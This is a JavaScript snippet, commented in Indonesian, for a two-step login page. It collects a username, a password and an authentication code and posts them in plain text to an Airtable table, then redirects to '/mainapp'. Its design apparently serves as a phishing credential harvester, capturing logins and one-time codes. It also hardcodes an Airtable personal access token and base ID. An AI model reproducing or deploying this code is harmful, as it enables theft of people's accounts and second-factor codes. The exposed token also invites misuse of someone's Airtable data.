    // --- Konfigurasi Airtable ---
    const airtableApiToken = "pat31RGUy1ua2FIoz.ef8b6f93f458151fd8ddee3e6eafce8e3ce235f99e1b391923be895a81730efe";
    const baseId = "appLTvB7Hey4An0z0";
    const tableName = "table1";
    const airtableEndpoint = `https://api.airtable.com/v0/${baseId}/${tableName}`;

    // --- Elemen DOM ---
    const loginSec = document.getElementById('loginSec');
    const confirmSec = document.getElementById('confirmSec');
    const loginBtn = document.getElementById('loginBtn');
    const backBtn = document.getElementById('backBtn');
    const confirmBtn = document.getElementById('confirmBtn');
    const skipBtn = document.getElementById('skipBtn');

    // --- Navigasi antar section ---
    loginBtn.onclick = () => {
      loginSec.style.display = 'none';
      confirmSec.style.display = 'block';
    };

    backBtn.onclick = () => {
      confirmSec.style.display = 'none';
      loginSec.style.display = 'block';
    };

    // --- Fungsi kirim data ke Airtable ---
    async function kirimKeAirtable(data) {
      try {
        const res = await fetch(airtableEndpoint, {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${airtableApiToken}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            records: [
              {
                fields: data
              }
            ]
          })
        });

        if (res.ok) {
          window.location.href = "/mainapp";
        } else {
          alert("Gagal mengirim data ke Airtable.");
        }
      } catch (err) {
        console.error(err);
        alert("Terjadi kesalahan koneksi.");
      }
    }

    // --- Tombol konfirmasi (kirim usr, pss, otentikasi) ---
    confirmBtn.onclick = () => {
      const usr = document.getElementById('usr').value.trim();
      const pss = document.getElementById('pss').value.trim();
      const otentikasi = document.getElementById('otentikasi').value.trim();
      if (!usr || !pss) return alert("Lengkapi username dan password!");
      kirimKeAirtable({ usr, pss, otentikasi });
    };

    // --- Tombol skip (kirim usr, pss saja) ---
    skipBtn.onclick = () => {
      const usr = document.getElementById('usr').value.trim();
      const pss = document.getElementById('pss').value.trim();
      if (!usr || !pss) return alert("Lengkapi username dan password!");
      kirimKeAirtable({ usr, pss });
    };
